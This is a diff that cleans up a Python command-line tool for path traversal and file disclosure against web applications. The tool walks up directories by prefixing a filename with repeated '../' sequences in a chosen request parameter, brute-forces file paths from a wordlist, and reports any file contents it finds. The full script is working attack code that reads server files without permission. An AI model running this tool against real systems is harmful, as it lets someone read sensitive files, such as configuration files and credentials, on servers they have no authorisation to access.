@@ -2,66 +2,66 @@ import requests
 import argparse
 from termcolor import colored
 
-def deafultconfig():
-    file = args.wordlist
-    with open(file, 'r') as wordlist:
-        for word in wordlist:
-            print(word)
-            print(url,args.param, word, headers)
-            req = requests.get(url=url, params={args.param:word},headers=headers)
-            print(req.text)
+def defaultconfig(url, headers, errpage, args):
+    with open(args.wordlist, 'r') as wordlist:
+        for line in wordlist:
+            word = line.strip()
+            print(colored(f"[~] Trying: {word}", "yellow"))
+            req = requests.get(url=url, params={args.param: word}, headers=headers)
+            if req.text != errpage.text:
+                print(colored("[+] File Found:", "green"))
+                print(f"    Path: {word}")
+                print(f"    Content: {colored(req.text[:100], 'cyan')}...\n")
 
-def filefinder():
-    escape= ''
-    payload = filename
+def filefinder(url, filename, headers, errpage, args):
+    escape = ''
     for i in range(20):
         payload = escape + filename
-        params = {
-            args.param:payload
-        }
-        req = requests.get(url=url, params=params,headers=headers)
+        req = requests.get(url=url, params={args.param: payload}, headers=headers)
         if req.text != errpage.text:
             print(colored("[+] File Found:", "green"))
-            print(f"    Value: {colored(req.text, 'cyan')}")
-
-            print(colored("[+] Payload Used:", "green"))
             print(f"    Payload: {colored(payload, 'yellow')}")
-        escape=escape + "../"
-
+            print(f"    Response:\n{colored(req.text, 'cyan')}")
+            break
+        escape += "../"
 
 parser = argparse.ArgumentParser(description="Send a request with filename parameter")
 parser.add_argument("-u", "--url", required=True, help="Target URL")
-parser.add_argument("-f", "--file", required=False, help="Filename to send as parameter")
-parser.add_argument("-w", "--wordlist", required=False, help="Wordlist to Brutedorce")
-parser.add_argument("-t", "--token", required=False, help="Authentication token")
-parser.add_argument("-p","--param", required=True,help="Parameter for the http request")
-parser.add_argument("-m","--mode",required=False, help="Enter mode to perform operation")
+parser.add_argument("-f", "--file", help="Filename to send as parameter")
+parser.add_argument("-w", "--wordlist", help="Wordlist to bruteforce")
+parser.add_argument("-t", "--token", help="Authentication token")
+parser.add_argument("-p", "--param", required=True, help="Parameter for the HTTP request")
+parser.add_argument("-m", "--mode", help="Mode: filefinder | defaultconfig")
 args = parser.parse_args()
 
 url = args.url
-filename=args.file
+filename = args.file
+headers = {"Authorization": f"Bearer {args.token}"} if args.token else {}
 
-if (args.token):
-    headers = {
-        "Authorization": f"Bearer {args.token}"
-    }
-else:
-    headers = None
-errpage = requests.get(url=url,params={args.param:"errorfiledoesnotexits"},headers=headers)
+errpage = requests.get(url=url, params={args.param: "thisshouldnotexist"}, headers=headers)
 
 if args.mode == "defaultconfig":
-    if (args.wordlist):
-        deafultconfig()
+    if args.wordlist:
+        defaultconfig(url, headers, errpage, args)
     else:
-        print("Enter Wordlist")
-if args.mode == "filefinder":
-    if(args.file):
-        filefinder()
+        print(colored("[-] Please provide a wordlist with -w", "red"))
+
+elif args.mode == "filefinder":
+    if args.file:
+        filefinder(url, filename, headers, errpage, args)
     else:
-        print("Enter file name (-f)")
+        print(colored("[-] Please provide a filename with -f", "red"))
+
+elif args.mode is None:
+    if args.file:
+        req = requests.get(url=url, params={args.param: args.file}, headers=headers)
+        if req.text != errpage.text:
+            print(colored("[+] File Found:", "green"))
+            print(req.text)
+        else:
+            print(colored("[-] File not found", "red"))
+    else:
+        print(colored("[-] Please provide a filename with -f", "red"))
+
 else:
-    req = requests.get(url=url, params={args.param:args.file}, headers=headers)
-    if req.text != errpage.text:
-        print(req.text)
-    else:
-        print("File not found")
+    print(colored("[-] Invalid mode. Use --mode filefinder or defaultconfig", "red"))
